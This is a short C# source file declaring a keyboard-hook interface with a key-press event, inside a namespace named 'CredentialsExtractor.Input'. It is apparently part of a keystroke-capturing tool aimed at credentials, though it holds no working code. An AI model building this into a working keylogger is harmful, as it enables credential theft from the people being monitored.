namespace CredentialsExtractor.Input
{
    public interface IKeyboardHook : System.IDisposable
    {
        event System.EventHandler<KeyPressEventArgs> KeyPressed;
        bool Initialize(int timeoutMs = 2000);
        void Stop();
    }
}